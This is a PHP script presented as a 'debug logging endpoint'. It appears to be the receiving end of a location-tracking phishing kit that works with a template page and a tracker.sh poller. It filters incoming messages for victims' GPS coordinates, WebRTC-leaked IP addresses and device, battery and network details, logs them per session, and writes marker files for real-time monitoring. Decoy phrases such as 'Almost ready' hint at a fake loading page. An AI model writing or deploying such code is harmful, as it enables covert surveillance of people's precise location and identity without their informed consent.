<?php
/**
 * Debug Logging Endpoint
 * 
 * Receives debug messages from the client-side JavaScript in template.php
 * and logs essential data for real-time monitoring by tracker.sh.
 * 
 * Connected files:
 *   - template.php: Sends POST messages from debugLog() function
 *   - tracker.sh: Polls for LocationLog.log marker files
 *   - location.php: Related data receiver for GPS/WebRTC
 */

// ─────────────────────────────────────────────
// Configuration
// ─────────────────────────────────────────────
$config = [
    'debug_log_file'       => 'location_debug.log',
    'marker_file'          => 'LocationLog.log',
    'error_marker_file'    => 'LocationError.log',
    'max_message_length'   => 1024,
    'log_timestamp'        => true,
    'enable_marker_files'  => true,  // Creates marker files for tracker.sh polling
];

// ─────────────────────────────────────────────
// Security Headers
// ─────────────────────────────────────────────
header('X-Content-Type-Options: nosniff');
header('Cache-Control: no-store, no-cache, must-revalidate');
header('Content-Type: application/json; charset=utf-8');

// ─────────────────────────────────────────────
// Only accept POST
// ─────────────────────────────────────────────
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['status' => 'error', 'code' => 405, 'msg' => 'Method Not Allowed']);
    exit;
}

// ─────────────────────────────────────────────
// Get input
// ─────────────────────────────────────────────
$message    = $_POST['message'] ?? '';
$type       = $_POST['type'] ?? 'data';
$session    = $_POST['session'] ?? 'unknown';
$timestamp  = $_POST['ts'] ?? time();

// ─────────────────────────────────────────────
// Validate
// ─────────────────────────────────────────────
if (empty($message)) {
    echo json_encode(['status' => 'error', 'msg' => 'No message provided']);
    exit;
}

// Trim to max length
$message = substr($message, 0, $config['max_message_length']);

// ─────────────────────────────────────────────
// Filter out noisy messages (internal JS noise)
// ─────────────────────────────────────────────
$filtered_phrases = [
    "Location data sent",
    "getLocation called",
    "Geolocation error",
    "Location permission denied",
    "Initializing",
    "Optimizing your experience",
    "Almost ready",
    "Loading",
    "Completing setup",
];

$should_filter = false;
foreach ($filtered_phrases as $phrase) {
    if (stripos($message, $phrase) !== false) {
        $should_filter = true;
        break;
    }
}

// ─────────────────────────────────────────────
// Determine if this is essential data worth logging
// ─────────────────────────────────────────────
$is_essential = false;

// GPS coordinates received
if (stripos($message, 'Lat:') !== false || 
    stripos($message, 'Latitude:') !== false || 
    stripos($message, 'Lon:') !== false ||
    stripos($message, 'Longitude:') !== false) {
    $is_essential = true;
}

// Position obtained
if (stripos($message, 'Position obtained') !== false) {
    $is_essential = true;
}

// WebRTC IPs
if (stripos($message, 'WebRTC IPs:') !== false || 
    stripos($message, 'WebRTC IP:') !== false) {
    $is_essential = true;
}

// Device/battery info
if (stripos($message, 'Device:') !== false || 
    stripos($message, 'Battery:') !== false ||
    stripos($message, 'Network:') !== false) {
    $is_essential = true;
}

// GPS errors (useful for debugging)
if (stripos($message, 'GPS error') !== false ||
    stripos($message, 'GPS unavailable') !== false ||
    stripos($message, 'GPS request timed out') !== false) {
    $is_essential = true;
    $type = 'gps_error';
}

// ─────────────────────────────────────────────
// Build log entry
// ─────────────────────────────────────────────
$date = date('Y-m-d H:i:s');
$log_entry = "[$date] [$session] [$type] $message\n";

// ─────────────────────────────────────────────
// Log only essential data to the debug log file
// ─────────────────────────────────────────────
if ($is_essential && !$should_filter) {
    // Write to debug log file
    $fp = @fopen($config['debug_log_file'], 'a');
    if ($fp) {
        flock($fp, LOCK_EX);
        fwrite($fp, $log_entry);
        fclose($fp);
    }
    
    // Create marker file for tracker.sh to detect
    if ($config['enable_marker_files']) {
        // Marker for location data captured
        if (stripos($message, 'Lat:') !== false || 
            stripos($message, 'Position obtained') !== false) {
            file_put_contents($config['marker_file'], 
                "Location data captured at $date\n", 
                FILE_APPEND | LOCK_EX);
        }
        
        // Marker for errors
        if ($type === 'gps_error') {
            file_put_contents($config['error_marker_file'], 
                "GPS Error at $date: $message\n", 
                FILE_APPEND | LOCK_EX);
        }
    }
    
    // Also log to a JSON-based debug file for structured access
    $json_log_file = 'debug_events.ndjson';
    $json_entry = json_encode([
        'timestamp' => $date,
        'unix_ts'   => time(),
        'session'   => $session,
        'type'      => $type,
        'message'   => $message,
    ], JSON_UNESCAPED_SLASHES) . PHP_EOL;
    
    file_put_contents($json_log_file, $json_entry, FILE_APPEND | LOCK_EX);
}

// ─────────────────────────────────────────────
// Return success to the client
// ─────────────────────────────────────────────
echo json_encode([
    'status'  => 'success',
    'logged'  => ($is_essential && !$should_filter),
    'session' => $session,
]);
exit;
